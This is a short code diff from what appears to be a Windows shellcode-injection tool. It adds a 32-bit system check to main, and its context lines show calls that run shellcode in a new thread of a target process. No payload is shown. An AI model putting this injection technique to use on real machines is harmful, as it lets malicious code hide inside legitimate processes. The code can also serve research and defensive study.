@@ -7,6 +7,7 @@
 
 #include "payload.h"
 #include "map_buffer_into_process.h"
+#include "sysutil.h"
 
 typedef enum {
     ADD_THREAD,
@@ -76,7 +77,6 @@ bool inject_in_existing_process()
     return run_shellcode_in_new_thread(hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
 }
 
-
 int main()
 {
    if (load_ntdll_functions() == FALSE) {
@@ -87,7 +87,11 @@ int main()
         printf("Failed to load KERNEL32 function\n");
         return (-1);
     }
-
+    if (!is_system32b()) {
+        printf("[ERROR] Not supported! System is NOT 32 bit\n");
+        system("pause");
+        return (-1);
+    }
     TARGET_TYPE targetType = TARGET_TYPE::NEW_PROC;
 
     switch (targetType) {
